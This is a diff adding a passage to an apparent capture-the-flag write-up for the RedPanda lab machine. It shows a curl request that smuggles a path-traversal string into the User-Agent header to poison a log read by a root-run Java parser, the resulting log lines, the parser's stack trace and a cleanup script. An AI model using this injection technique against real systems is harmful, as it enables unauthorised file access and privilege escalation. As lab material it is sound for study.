@@ -907,6 +907,82 @@ this.. should work:
 $ curl http://redpanda.htb:8080/it/doesnt/matter -H "User-Agent: curl/7.x.x||/../../../../../../home/woodenk/foo.jpg"
 ```
 
+and it does. with the logs stuffed:
+```
+woodenk@redpanda:~$ tail -f /opt/panda_search/redpanda.log
+
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/it/doesnt/matter
+404||10.10.14.9||curl/7.x.x||/../../../../../../home/woodenk/foo.jpg||/error
+
+```
+
+running the logparser, get
+```
+woodenk@redpanda:~$ java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
+/../../../../../../home/woodenk/foo.jpg
+Artist: ../home/woodenk/foo
+Exception in thread "main" java.io.FileNotFoundException: /credits/../home/woodenk/foo_creds.xml (Permission denied)
+        at java.base/java.io.FileInputStream.open0(Native Method)
+        at java.base/java.io.FileInputStream.open(FileInputStream.java:219)
+        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:157)
+        at java.base/java.io.FileInputStream.<init>(FileInputStream.java:112)
+        at java.base/sun.net.www.protocol.file.FileURLConnection.connect(FileURLConnection.java:86)
+        at java.base/sun.net.www.protocol.file.FileURLConnection.getInputStream(FileURLConnection.java:184)
+        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:652)
+        at java.xml/com.sun.org.apache.xerces.internal.impl.XMLVersionDetector.determineDocVersion(XMLVersionDetector.java:150)
+        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:860)
+        at java.xml/com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:824)
+        at java.xml/com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)
+        at java.xml/com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1216)
+        at java.xml/com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:635)
+        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:217)
+        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:277)
+        at org.jdom2.input.sax.SAXBuilderEngine.build(SAXBuilderEngine.java:264)
+        at org.jdom2.input.SAXBuilder.build(SAXBuilder.java:1104)
+        at com.logparser.App.addViewTo(App.java:67)
+        at com.logparser.App.main(App.java:105)
+```
+
+our uri/user-agent trick worked, it's reading a file we control. it finds the artist we expect, forms the filename.. and permission denied?
+
+that relative path is definitely not writeable, while the direct is:
+```
+woodenk@redpanda:~$ cat /credits/../home/woodenk/foo_creds.xml
+cat: /credits/../home/woodenk/foo_creds.xml: Permission denied
+woodenk@redpanda:~$ ls -l foo_creds.xml
+-rw-rw-r-- 1 woodenk woodenk 151 Jul 18 02:48 foo_creds.xml
+```
+
+since `root` is the one actually running, any `Permission denied` is questionable - but this feels like an FS/kernel.. and the file hasn't changed after the truncation cycle.
+
+looking at `/opt/cleanup.sh`
+```bash
+#!/bin/bash
+/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
+```
+
+it it removing `.xml` and `.jpg` from
+  * `/tmp`
+  * `/var/tmp`
+  * `/dev/shm`
+  * `/home/woodenk`
+
+but if the issue is the relative path, they all have the same problem.
+
+
+
+
 ## flag
 
 ```
